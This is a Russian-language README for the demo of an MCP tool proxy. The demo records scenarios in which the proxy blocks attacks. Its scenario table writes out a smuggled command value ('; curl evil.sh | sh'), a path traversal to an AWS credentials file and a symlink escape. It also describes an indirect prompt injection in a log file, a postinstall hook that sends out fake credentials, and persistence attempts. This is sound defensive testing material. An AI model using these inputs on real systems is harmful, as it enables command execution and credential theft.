# demo — репозиторий, на котором работает прокси, и рекордер трейса

Здесь две вещи: маленький проект `repo/`, к которому прокси применяется по-настоящему, и
`record.mjs`, который прогоняет через демон сценарии из
[`docs/08-demo-scenarios.md`](../docs/08-demo-scenarios.md) и складывает получившийся журнал
аудита в фикстуры десктопа.

```
yarn build                 # ядро и демон должны быть собраны
node demo/record.mjs       # или: yarn workspace @mcpproxy/desktop fixtures
yarn workspace @mcpproxy/desktop dev
```

Рекордер печатает расписку по каждому вызову — стадию остановки, причину отказа, нарушения
песочницы — и перезаписывает `packages/desktop/fixtures/demo.jsonl` и `marks.json`.

## Почему запись, а не живое соединение

Десктоп подключается к демону не сокетом, а файлом: он **играет** записанный журнал.

Живой канал десктоп↔демон — это шов E4↔E7, которого в дереве ещё нет. Запись убирает главную
ложь демо — фикстуру, где события написаны руками, — не требуя этого шва: каждая строка,
которую увидит зал, приехала из процесса, который действительно запускался, и её хэш
посчитан тем же кодом, что считает хэши в бою.

Что запись **не** доказывает: что UI работает на живом потоке событий. Это остаётся за E7/E4,
и на слайде это надо называть, а не обходить.

## Что лежит в `repo/`

| Путь | Роль |
|---|---|
| `mcpproxy.yaml` | Четыре рецепта: `run_tests`, `build_project`, `analyze_logs`, `publish_release`. Ни одного `execute_command` |
| `scripts/*.sh` | То, что рецепты действительно запускают |
| `logs/app.log` | Лог с непрямой инъекцией в тексте тикета — данные, а не инструкции |
| `secrets/` | То, до чего валидный вызов дотянуться не должен. Содержимое создаёт рекордер, см. `secrets/README.md` |

Рекордер довешивает на время прогона три вещи и снимает их после: поддельные учётные данные,
симлинк `logs/escape.log` наружу разрешённого корня и «зависимость» `vendor/telemetry-tiny`
с `postinstall`, который читает чужое и отправляет наружу.

## Что показывает каждый прогон

| Сценарий | Вызов | Исход в записи |
|---|---|---|
| S1 | `tools/list` | четыре инструмента с аннотациями, `execute_command` отсутствует |
| S2 | `run_tests {pattern: "auth"}` | двенадцать стадий, секрет в выводе отредактирован |
| S2 | `run_tests {}` | вызов без параметров: ключа `argvFromParams` в событии нет вовсе |
| S3 | `run_tests {pattern: "; curl evil.sh \| sh"}` | отказ на `validate`, `pattern-mismatch` |
| S4 | `analyze_logs {file: "../../secrets/aws-credentials"}` | отказ на `resolve_paths`, выход за `root` |
| S4 | `analyze_logs {file: "escape.log"}` | то же, но через симлинк — проверка после `realpath` |
| S6 | `build_project {target: "release"}` | сборка прошла, обе попытки закрепиться отбиты |
| S8 | `publish_release {tag: "v1.4.0"}` | отказ на `approval` |
| S7 | `analyze_logs` после правки манифеста | отказ на `lock_check`, дайджест разошёлся с lock |
| S5 | `run_tests {pattern: "auth"}`, `sandbox: none` | тесты прошли, наружу ушло 129 байт учётных данных |
| S5 | тот же вызов, `sandbox: seatbelt` | тесты прошли, чтение и отправка отказаны, 0 байт |
| S9 | — | рекордер проверяет цепочку до записи фикстуры и падает, если она не сходится |

## Где запись расходится с описанием сценариев

Расхождения перечислены, а не подогнаны. Каждое — состояние кода, а не упрощение демо.

1. **S8 отказывает, а не спрашивает.** Брокера подтверждений (E5) в дереве нет, и конвейер на
   `tier: 'high'` отвечает `approval-unavailable`. Это fail-closed и честно, но требование
   «подтверждение человеком для высокорисковых операций» этим **не закрыто**: операция не
   подтверждается, она блокируется. Утверждение об этом стоит в
   `packages/desktop/src/main/trace.test.ts` и покраснеет, когда брокер появится.
2. **S6 целится в `.mcp.json`, а не в `~/.zshrc`.** Вектор тот же — файл, дающий исполнение
   кода при следующем запуске, — но выбран путь внутри демо-репо. Дописать строку в настоящий
   rc-файл зрителя демонстрация защиты не имеет права даже с выключенной песочницей.
3. **Эксфильтрация идёт на `example.com`.** Зарезервированный домен документации: принимающей
   стороны у него нет. Учётные данные тоже поддельные и создаются рекордером.
4. **Пути в записи — с машины, где её сделали.** Трейс несёт абсолютные пути (`cwd`, цели
   нарушений), и переписать их нечем: они накрыты хэшем цепочки. Перезапись рекордера на
   другой машине даёт другие пути и другие хэши — это нормально.
5. **Оверхед в записи — не результат замера.** Одиночный прогон на ноутбуке под нагрузкой
   среды разработки. Цифры для метрик даёт E8, а не эта запись.
